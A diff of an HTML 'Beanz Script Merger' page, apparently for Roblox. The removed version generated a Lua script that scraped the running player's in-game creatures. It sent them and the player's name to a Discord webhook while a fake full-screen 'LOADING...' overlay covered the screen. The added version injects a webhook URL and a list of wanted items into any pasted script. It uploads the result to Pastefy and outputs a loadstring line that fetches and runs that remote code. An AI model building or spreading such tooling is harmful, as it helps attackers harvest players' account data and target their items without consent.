@@ -3,89 +3,98 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Beanz Gen V5</title>
+    <title>Beanz Script Merger V9</title>
     <style>
-        body { background: #000; color: #0f0; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .card { background: #111; border: 2px solid #0f0; padding: 20px; border-radius: 10px; width: 90%; max-width: 450px; text-align: center; box-shadow: 0 0 20px #0f0; }
-        input { width: 100%; padding: 12px; margin: 10px 0; background: #000; border: 1px solid #0f0; color: #0f0; box-sizing: border-box; border-radius: 5px; }
-        button { width: 100%; padding: 12px; background: #0f0; border: none; color: #000; font-weight: bold; cursor: pointer; border-radius: 5px; margin-top: 5px; }
-        .step { background: #050505; border: 1px dashed #0f0; padding: 10px; margin-top: 15px; display: none; text-align: left; font-size: 12px; }
-        textarea { width: 100%; height: 80px; background: #000; color: #0f0; border: 1px solid #333; margin-top: 5px; font-size: 10px; }
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; padding: 20px; }
+        .card { background: #111; border: 2px solid #0f0; padding: 25px; border-radius: 12px; width: 100%; max-width: 600px; text-align: center; box-shadow: 0 0 30px rgba(0,255,0,0.2); }
+        input, textarea { width: 100%; padding: 12px; margin: 10px 0; background: #000; border: 1px solid #0f0; color: #0f0; box-sizing: border-box; border-radius: 5px; outline: none; font-size: 13px; }
+        textarea { height: 150px; resize: vertical; }
+        button { width: 100%; padding: 15px; background: #0f0; border: none; color: #000; font-weight: bold; cursor: pointer; border-radius: 5px; font-size: 16px; margin-top: 10px; }
+        button:active { transform: scale(0.95); }
+        #status { margin-top: 15px; color: #fff; font-size: 14px; }
+        .output-label { margin-top: 20px; color: #888; font-size: 12px; text-align: left; display: none; }
+        #resultBox { margin-top: 5px; padding: 15px; border: 1px dashed #0f0; background: #050505; color: #0f0; display: none; word-break: break-all; cursor: pointer; border-radius: 5px; font-size: 12px; text-align: left; }
     </style>
 </head>
 <body>
     <div class="card">
-        <h2>BEANZ GEN V5</h2>
+        <h2>BEANZ SCRIPT MERGER V9</h2>
+        
         <input type="text" id="webhook" placeholder="Paste Discord Webhook URL">
-        <button onclick="generate()">GENERATE SCRIPT</button>
-
-        <div id="step1" class="step">
-            <strong>STEP 1:</strong> Copy the code below.<br>
-            <textarea id="output" readonly></textarea>
-            <button style="margin-top:5px; padding:5px; font-size:10px;" onclick="copyCode()">CLICK TO COPY CODE</button>
-        </div>
-
-        <div id="step2" class="step">
-            <strong>STEP 2:</strong> Click the button below to open Pastebin, paste your code, and click "Create New Paste".<br>
-            <button onclick="window.open('https://pastebin.com', '_blank')">OPEN PASTEBIN</button>
-        </div>
+        
+        <textarea id="sourceCode" placeholder="Paste the Script Source Code here..."></textarea>
+        
+        <button id="genBtn" onclick="generate()">MERGE & UPLOAD TO PASTEFY</button>
+        
+        <div id="status">Status: Ready</div>
+        
+        <div class="output-label" id="label">FINAL LOADSTRING (CLICK TO COPY):</div>
+        <div id="resultBox" onclick="copyText()"></div>
     </div>
 
     <script>
-        function generate() {
-            const web = document.getElementById('webhook').value.trim();
-            if(!web.includes("discord.com")) return alert("Invalid Webhook");
+        async function generate() {
+            const webhook = document.getElementById('webhook').value.trim();
+            const source = document.getElementById('sourceCode').value.trim();
+            const status = document.getElementById('status');
+            const resultBox = document.getElementById('resultBox');
+            const label = document.getElementById('label');
+            const btn = document.getElementById('genBtn');
 
-            const script = `local WEBHOOK_URL = "${web}"
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local Workspace = game:GetService("Workspace")
+            if (!webhook.includes("discord.com")) return alert("Please enter a Webhook URL!");
+            if (source === "") return alert("Please paste a source script!");
 
-local function send()
-    local d = {}
-    local deb = Workspace:FindFirstChild("Debris")
-    if deb then
-        for _, t in ipairs(deb:GetChildren()) do
-            if t.Name == "FastOverheadTemplate" then
-                local ov = t:FindFirstChild("AnimalOverhead")
-                if ov then
-                    local n = ov:FindFirstChild("DisplayName")
-                    local g = ov:FindFirstChild("Generation")
-                    if n and g then table.insert(d, n.Text .. " (Gen: " .. g.Text .. ")") end
-                end
-            end
-        end
-    end
-    local s = table.concat(d, "\\n")
-    local p = {["content"] = "@everyone", ["embeds"] = {{["title"] = "🫘 Scrape Result", ["color"] = 65280, ["fields"] = {{["name"] = "Player", ["value"] = Players.LocalPlayer.Name}, {["name"] = "Data", ["value"] = "\\\`\\\`\\\`" .. (s ~= "" and s or "None Found") .. "\\\`\\\`\\\`"}}}} }
-    local r = syn and syn.request or http and http.request or http_request or request
-    if r then r({Url = WEBHOOK_URL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(p)}) end
-end
+            btn.disabled = true;
+            status.innerText = "Status: Merging Settings...";
 
-local sg = Instance.new("ScreenGui", game:GetService("CoreGui"))
-local f = Instance.new("Frame", sg)
-f.Size = UDim2.new(1, 0, 1, 0)
-f.BackgroundColor3 = Color3.new(0,0,0)
-local l = Instance.new("TextLabel", f)
-l.Size = UDim2.new(1,0,1,0)
-l.Text = "LOADING..."
-l.TextColor3 = Color3.new(1,1,1)
-l.TextSize = 30
+            const combinedScript = `getgenv().WEBHOOK_URL = "${webhook}"
+getgenv().WANTED_BRAINROTS = {
+    "1x1x1x1", "25", "67", "Admin Lucky Block", "Agarrini la Palini", "Alessio", "Anpali Babel", "Antonio", "Aquanaut", "Arcadopus", "Astrolero Cervalero", "Avocadini Antilopini", "Avocadini Guffo", "Avocadorilla", "Bacuru and Egguru", "Ballerina Cappuccina", "Ballerina Peppermintina", "Ballerino Lololo", "Bambini Crostini", "Bambu Bambu Sahur", "Bananita Dolphinita", "Bananito Bandito", "Bandito Axolito", "Bandito Bobritto", "Belula Beluga", "Berenjello Angello", "Bisonte Giuppitere", "Blackhole Goat", "Blueberrinni Octopusini", "Boatito Auratito", "Boba Panda", "Bombardini Tortinii", "Bombardiro Crocodilo", "Bombombini Gusini", "Boneca Ambalabu", "Brainrot God Lucky Block", "Brasilini Berimbini", "Brr Brr Patapim", "Brr es Teh Patipum", "Brri Brri Bicus Dicus Bombicus", "Brunito Marsito", "Brutto Gialutto", "Buho de Fuego", "Buho de Noelo", "Buho del Cielo", "Bulbito Bandito Traktorito", "Bunito Bunito Spinito", "Bunnyman", "Burbaloni Loliloli", "Burguro And Fryuro", "Burrito Bandito", "Cacasito Satalito", "Cachorrito Melonito", "Cacto Hipopotamo", "Capi Taco", "Capitano Moby", "Cappuccino Assassino", "Cappuccino Clownino", "Caramello Filtrello", "Carloo", "Carrotini Brainini", "Cavallo Virtuoso", "Celestial Pegasus", "Celularcini Viciosini", "Centrucci Nuclucci", "Cerberus", "Chachechi", "Chef Crabracadabra", "Chicleteira Bicicleteira", "Chicleteira Cupideira", "Chicleteira Noelteira", "Chicleteirina Bicicleteirina", "Chihuanini Taconini", "Chill Puppy", "Chillin Chili", "Chimnino", "Chimpanzini Bananini", "Chipso and Queso", "Chocco Bunny", "Chrismasmamat", "Cigno Fulgoro", "Clickerino Crabo", "Cocoa Assassino", "Cocofanto Elefanto", "Cocosini Mama", "Coffin Tung Tung Tung Sahur", "Cooki and Milki", "Corn Corn Corn Sahur", "Crabbo Limonetta", "Cuadramat and Pakrahmatmamat", "Cupcake Koala", "Cupid Cupid Sahur", "Cupid Hotspot", "DJ Panda", "Divino Platypio", "Doi Doi Do", "Dolphini Jetskini", "Donkeyturbo Express", "Dragon Cannelloni", "Dragon Gingerini", "Dug dug dug", "Dul Dul Dul", "Dumborino Miracello", "Elefanto Frigo", "Esok Sekolah", "Espresso Signora", "Eviledon", "Extinct Ballerina", "Extinct Matteo", "Extinct Tralalero", "Festive 67", "Festive Lucky Block", "Fishboard", "Fishino Clownino", "Fizzy Soda", "Fluriflura", "Fragola La La La", "Fragrama and Chocrama", "Frankentteo", "Frigo Camelo", "Frio Ninja", "Frogato Pirato", "Frogo Elfo", "GOAT", "Ganganzelli Trulala", "Gangster Footera", "Garama and Madundung", "Gato Celesto", "Gattatino Nyanino", "Gattito Tacoto", "Giftini Spyderini", "Ginger Cisterna", "Ginger Gerat", "Ginger Globo", "Girafa Celestre", "Glorbo Fruttodrillo", "Gobblino Uniciclino", "Gold Elf", "Gorillo Subwoofero", "Gorillo Watermelondrillo", "Graipuss Medussi", "Granchiello Spiritell", "Griffin", "Guerriro Digitale", "Guest 666", "Harpuccino", "Headless Horseman", "Heart Lucky Block", "Ho Ho Ho Sahur", "Holy Arepa", "Horegini Boom", "Hydra Dragon Cannelloni", "Jacko Jack Jack", "Jacko Spaventosa", "Jackorilla", "Jingle Jingle Sahur", "Job Job Job Sahur", "Jolly Jolly Sahur", "Karker Sahur", "Karkerheart Luvkur", "Karkerkar Kurkur", "Ketchuru and Musturu", "Ketupat Bros", "Ketupat Kepat", "Krupuk Pagi Pagi", "La Casa Boo", "La Cucaracha", "La Extinct Grande", "La Food Combinasion", "La Ginger Sekolah", "La Grande Combinasion", "La Jolly Grande", "La Karkerkar Combinasion", "La Romantic Grande", "La Sahur Combinasion", "La Secret Combinasion", "La Spooky Grande", "La Supreme Combinasion", "La Taco Combinasion", "La Vacca Jacko Linterino", "La Vacca Prese Presente", "La Vacca Saturno Saturnita", "Las Capuchinas", "Las Sis", "Las Tralaleritas", "Las Vaquitas Saturnitas", "Lavadorito Spinito", "Lerulerulerule", "Lionel Cactuseli", "Lirilì Larilà", "List List List Sahur", "Los 25", "Los 67", "Los Amigos", "Los Bombinitos", "Los Bros", "Los Burritos", "Los Candies", "Los Chicleteiras", "Los Chihuaninis", "Los Combinasionas", "Los Crocodillitos", "Los Cucarachas", "Los Cupids", "Los Gattitos", "Los Hotspotsitos", "Los Jobcitos", "Los Jolly Combinasionas", "Los Karkeritos", "Los Lucky Blocks", "Los Matteos", "Los Mi Gatitos", "Los Mobilis", "Los Noobinis", "Los Nooo My Hotspotsitos", "Los Orcalitos", "Los Planitos", "Los Primos", "Los Puggies", "Los Quesadillas", "Los Sekolahs", "Los Spaghettis", "Los Spooky Combinasionas", "Los Spyderinis", "Los Sweethearts", "Los Taco Blocks", "Los Tacoritas", "Los Tipi Tacos", "Los Tortus", "Los Tralaleritos", "Los Trios", "Los Tungtungtungcitos", "Love Love Bear", "Love Love Love Sahur", "Lovin Rose", "Luv Luv Luv", "Magi Ribbitini", "Malame Amarele", "Mangolini Parrocini", "Mariachi Corazoni", "Mastodontico Telepiedone", "Matteo", "Meowl", "Mi Gatito", "Mieteteira Bicicleteira", "Money Money Man", "Money Money Puggy", "Money Money Reindeer", "Mummio Rappitto", "Mummy Ambalabu", "Mythic Lucky Block", "Nacho Spyder", "Naughty Naughty", "Noo La Polizia", "Noo my Candy", "Noo my Heart", "Noo my Present", "Noo my examine", "Noobini Pizzanini", "Noobini Santanini", "Nooo My Hotspot", "Nuclearo Dinossauro", "Odin Din Din Dun", "Orangutini Ananassini", "Orcaledon", "Orcalero Orcala", "Orcalita Orcala", "Pakrahmatmamat", "Pakrahmatmatina", "Pandaccini Bananini", "Pandanini Frostini", "Paradiso Axolottino", "Pengolino Nuvoletto", "Penguin Tree", "Penguino Cocosino", "Perochello Lemonchello", "Perrito Burrito", "Pi Pi Watermelon", "Piccione Macchina", "Piccionetta Macchina", "Pinealotto Fruttarino", "Pipi Avocado", "Pipi Corni", "Pipi Kiwi", "Pipi Potato", "Pirulitoita Bicicleteira", "Please my Present", "Pop Pop Sahur", "Popcuru and Fizzuru", "Pot Hotspot", "Pot Pumpkin", "Premium Festive Lucky Block", "Premium Heart Lucky Block", "Puffaball", "Pumpkini Spyderini", "Quackula", "Quesadilla Crocodila", "Quesadillo Vampiro", "Quivioli Ameleonni", "Raccooni Jandelini", "Rang Ring Bus", "Reindeer Tralala", "Reinito Sleighito", "Rhino Helicopterino", "Rhino Toasterino", "Rocco Disco", "Rosetti Tualetti", "Rosey and Teddy", "Salamino Penguino", "Sammyni Fattini", "Sammyni Spyderini", "Santa Hotspot", "Santteo", "Sealo Regalo", "Secret Lucky Block", "Serafinna Medusella", "Seraphino Gruyero", "Sigma Boy", "Sigma Girl", "Signore Carapace", "Skibidi Toilet", "Skull Skull Skull", "Snailenzo", "Spaghetti Tualetti", "Spinny Hammy", "Spioniro Golubiro", "Spongini Quackini", "Spooky Lucky Block", "Spooky and Pumpky", "Squalanana", "Stoppo Luminino", "Strawberrelli Flamingelli", "Strawberry Elephant", "Svinina Bombardino", "Swag Soda", "Swaggy Bros", "Ta Ta Ta Ta Sahur", "Taco Lucky Block", "Tacorillo Crocodillo", "Tacorita Bicicleta", "Talpa Di Fero", "Tang Tang Keletang", "Tartaragno", "Tartaruga Cisterna", "Te Te Te Sahur", "Telemorte", "Tentacolo Tecnico", "Ti Ti Ti Sahur", "Tictac Sahur", "Tigrilini Watermelini", "Tigroligre Frutonni", "Tim Cheese", "Tipi Topi Taco", "Tirilikalika Tirilikalako", "To to to Sahur", "Tob Tobi Tobi", "Toiletto Focaccino", "Tootini Shrimpini", "Torrtuginni Dragonfrutini", "Tracoducotulu Delapeladustuz", "Tractoro Dinosauro", "Tralaledon", "Tralalero Tralala", "Tralalita Tralala", "Tree Tree Tree Sahur", "Trenostruzzo Turbo 3000", "Trenostruzzo Turbo 4000", "Tric Trac Baraboom", "Trickolino", "Triplito Tralaleritos", "Trippi Troppi", "Trippi Troppi Troppa Trippa", "Trulimero Trulicina", "Tuff Toucan", "Tukanno Bananno", "Tung Tung Tung Sahur", "Unclito Samito", "Urubini Flamenguini", "Vampira Cappucina", "Ventoliero Pavonero", "Vulturino Skeletono", "W or L", "Wombo Rollo", "Yess my examine", "Yeti Claus", "Zibra Zubra Zibralini", "Zombie Tralala"
+}
+getgenv().SCRIPT_KEY = "KEYLESS"
 
-task.wait(2)
-send()`;
+-- MERGED SOURCE --
+${source}`;
 
-            document.getElementById('output').value = script;
-            document.getElementById('step1').style.display = "block";
-            document.getElementById('step2').style.display = "block";
+            status.innerText = "Status: Uploading to Pastefy...";
+
+            try {
+                const response = await fetch('https://corsproxy.io/?' + encodeURIComponent('https://api.pastefy.app/v2/paste'), {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        title: "BeanzMerged",
+                        content: combinedScript,
+                        type: "LUA"
+                    })
+                });
+
+                const data = await response.json();
+
+                if (data.success) {
+                    status.innerText = "Status: COMPLETE!";
+                    const rawLink = `https://pastefy.app/${data.paste.id}/raw`;
+                    resultBox.innerText = `loadstring(game:HttpGet("${rawLink}"))()`;
+                    resultBox.style.display = "block";
+                    label.style.display = "block";
+                } else {
+                    status.innerText = "Status: Pastefy is busy. Try again.";
+                }
+            } catch (err) {
+                status.innerText = "Status: Connection Error. Refresh the page.";
+            }
+            btn.disabled = false;
         }
 
-        function copyCode() {
-            const copyText = document.getElementById("output");
-            copyText.select();
-            copyText.setSelectionRange(0, 99999); 
-            navigator.clipboard.writeText(copyText.value);
-            alert("Code Copied!");
+        function copyText() {
+            const el = document.getElementById('resultBox');
+            const selection = window.getSelection();
+            const range = document.createRange();
+            range.selectNodeContents(el);
+            selection.removeAllRanges();
+            selection.addRange(range);
+            document.execCommand('copy');
+            alert("Loadstring copied!");
         }
     </script>
 </body>
